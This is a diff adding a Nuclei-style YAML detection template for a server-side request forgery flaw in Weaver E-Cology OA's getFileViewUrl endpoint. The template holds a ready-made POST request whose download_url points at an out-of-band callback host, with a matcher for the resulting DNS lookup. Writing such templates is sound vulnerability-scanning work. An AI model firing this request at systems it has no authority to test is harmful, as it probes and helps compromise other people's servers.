@@ -1,0 +1,24 @@
+id: poc-yaml-weaver-e-cology-getfileviewurl-ssrf
+info:
+  name: 泛微OA E-Cology getFileViewUrl SSRF漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: ssrf
+http:
+  - method: POST
+    path:
+      - /api/doc/mobile/fileview/getFileViewUrl
+    headers:
+      Content-Type: application/json
+    body: |-
+      {
+      "file_id": "1000",
+      "file_name": "c",
+      "download_url": "http://{{interactsh-url}}"
+      }
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
